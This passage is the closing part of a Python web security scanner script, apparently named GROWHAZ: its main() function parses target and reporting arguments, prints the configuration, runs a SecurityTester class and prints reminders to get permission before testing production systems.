    ║     GROWHAZ Professional Security Testing Tool v3.0          ║
    ║     Deep Scan | Stealth Mode | CVSS | OWASP | Threaded      ║
    ╚══════════════════════════════════════════════════════════════╝
    """)

    import argparse
    parser = argparse.ArgumentParser(description='Professional security testing tool for web applications.')
    parser.add_argument('base_url', help='Base URL of the target (e.g., https://example.com)')
    parser.add_argument('test_email', nargs='?', help='Test email for login (optional)')
    parser.add_argument('openapi_spec', nargs='?', help='Path to OpenAPI/Swagger JSON file (optional)')
    parser.add_argument('--js', action='store_true', help='Enable JavaScript crawling with Playwright')
    parser.add_argument('--report-id', help='Supabase report ID to update')
    
    args = parser.parse_args()

    base_url = args.base_url
    if not base_url.startswith(('http://', 'https://')):
        base_url = 'https://' + base_url

    report_id = args.report_id or os.getenv('REPORT_ID')
    
    print(f"\n📋 Configuration:")
    print(f"  • Target URL: {base_url}")
    print(f"  • Report ID: {report_id or 'Not provided'}")
    print(f"  • Test Email: {args.test_email or 'Not provided'}")
    print(f"  • OpenAPI Spec: {args.openapi_spec or 'Not provided'}")
    print(f"  • JavaScript Crawling: {'Enabled' if args.js else 'Disabled'}")
    print(f"  • Supabase URL: {'Configured' if os.getenv('SUPABASE_URL') else 'Not configured'}")
    print(f"  • Supabase Key: {'Configured' if os.getenv('SUPABASE_KEY') else 'Not configured'}")

    if not report_id:
        print("\n⚠️  WARNING: No report ID provided. Results will be saved locally but not to Supabase.")

    print("\n🚀 Running in automated mode (no confirmation needed)")
    print("=" * 60)
    
    tester = SecurityTester(
        base_url, 
        report_id=report_id,
        test_email=args.test_email, 
        openapi_spec=args.openapi_spec, 
        use_js=args.js
    )
    
    exit_code = tester.run_all_tests()

    print("\n" + "=" * 60)
    print("📝 IMPORTANT NOTES:")
    print("  • This tool only tests for COMMON vulnerabilities")
    print("  • Manual testing is still required for comprehensive assessment")
    print("  • Always test in a STAGING environment first")
    print("  • Never test production systems without permission")
    print("=" * 60)
    
    sys.exit(exit_code)

if __name__ == "__main__":
    main()